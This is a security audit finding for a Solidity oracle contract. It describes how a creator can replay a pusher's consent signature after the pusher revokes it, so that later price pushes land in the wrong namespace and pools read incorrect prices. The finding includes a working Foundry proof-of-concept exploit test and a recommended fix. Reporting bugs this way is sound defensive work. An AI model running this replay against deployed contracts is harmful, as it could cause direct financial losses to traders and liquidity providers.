### Title
Pusher consent signature replayable within deadline window re-establishes revoked delegation, feeding wrong prices into pools — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` does not track consumed consent signatures. A creator can replay a pusher's original EIP-191 consent — with the same `deadline` — immediately after the pusher calls `revokePusher()`, silently re-establishing the delegation. The pusher, believing they have exited, continues pushing prices intended for their own namespace; those pushes land in the creator's namespace and can reach a pool as bad prices.

---

### Finding Description

The `allowPushers` function validates a pusher's EIP-191 consent signature and writes `namespaceRemapping[pusher] = msg.sender`: [1](#0-0) 

The only replay protection is the deadline check (`_ensureDeadline`). There is no used-signature registry. The `revokePusher` function clears the mapping: [2](#0-1) 

Because the same `(deadline, pusher, creator)` tuple is never marked consumed, the creator can immediately call `allowPushers` again with the identical signature bytes, overwriting `namespaceRemapping[pusher]` back to themselves — as many times as they like until the deadline expires.

The `fallback` push path resolves the namespace from `namespaceRemapping[msg.sender]`: [3](#0-2) 

So every push the pusher makes after their revocation — intended for their own namespace — silently lands in the creator's namespace instead.

The code comment acknowledges the deadline as the sole guard against post-revocation replay: [4](#0-3) 

But the deadline only bounds the window; it does not prevent replay within that window. A pusher who revokes one second after `allowPushers` is called with a 24-hour deadline has 23 h 59 m of exposure.

---

### Impact Explanation

A pool backed by the creator's `CompressedOracleV1` feeds (via `PriceProvider` or `AnchoredPriceProvider`) reads prices through `_price(feedId)` → `getOracleData(feedId)`, which decodes the creator's storage slot: [5](#0-4) 

If the pusher, after revoking, begins pushing prices for a different asset (e.g., BTC/USD into their own namespace), and the creator replays the consent to re-establish the delegation, those BTC/USD values overwrite the creator's ETH/USD slot. The pool's `getBidAndAskPrice` call then returns a grossly wrong mid/spread, causing swaps to execute at an incorrect price — direct loss of funds for traders or LPs.

---

### Likelihood Explanation

- The creator must be adversarial toward their own pusher (semi-trusted, not fully trusted).
- The pusher must push data after revoking while the deadline is still live.
- No special permissions or external conditions are required; `allowPushers` is callable by any address with a valid pusher signature.
- Deadlines in practice are set to hours or days (as shown in tests using `block.timestamp + 1 days`), giving a wide replay window. [6](#0-5) 

---

### Recommendation

Track consumed consent signatures in a `mapping(bytes32 => bool) usedConsents` keyed on `keccak256(abi.encode(chainid, address(this), deadline, pusher, creator))`. Mark it `true` on first use and revert on replay. Alternatively, include a per-pusher nonce in the signed message and increment it on each `allowPushers` call, so a revoked pusher can invalidate all prior consents by incrementing their nonce.

---

### Proof of Concept

```solidity
function test_replayConsentAfterRevoke() public {
    uint256 deadline = block.timestamp + 1 days;

    // 1. Pusher signs consent for creator
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // 2. Creator establishes delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // 3. Pusher revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // 4. Creator replays the SAME signature — no revert, delegation restored
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator); // pusher is re-delegated without consent

    // 5. Pusher pushes BTC/USD prices thinking they go to own namespace;
    //    they land in creator's namespace instead → pool reads wrong asset price
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 wrongPrice = _packRaw(9_000_000, 4, 2); // BTC/USD, not ETH/USD
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, wrongPrice, tsMs));
    assertTrue(ok);

    IOffchainOracle.OracleData memory data = oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
    // creator's ETH/USD feed now holds BTC/USD price
    assertEq(data.price, U64x32.decode(uint32(wrongPrice >> 16)));
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L171-178)
```text
    function _price(bytes32 feedId)
        internal
        view
        returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        OracleData memory data = getOracleData(feedId);
        return (uint256(data.price), uint256(data.spread0), data.spread1, data.timestampMs.toSeconds());
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-211)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-321)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }
```

**File:** smart-contracts-poc/test/oracles/compressed/CompressedOracle.t.sol (L339-356)
```text
    function testAllowPushersDelegatesNamespace() public {
        uint256 deadline = block.timestamp + 1 days;
        _allowPusher(deadline);
        assertEq(oracle.namespaceRemapping(pusher), creator, "pusher should map to creator");

        // delegated push lands in the CREATOR namespace, not the pusher's own
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw = _packRaw(900_000, 5, 0);
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(_wordAt(2, 3, raw, tsMs));
        assertTrue(ok, "delegated push failed");

        IOffchainOracle.OracleData memory data = oracle.getOracleData(oracle.feedIdOf(creator, 2, 3));
        assertEq(data.price, U64x32.decode(uint32(raw >> 16)), "delegated push should land in creator namespace");

        IOffchainOracle.OracleData memory own = oracle.getOracleData(oracle.feedIdOf(pusher, 2, 3));
        assertEq(own.price, 0, "pusher's own namespace must stay empty");
    }
```
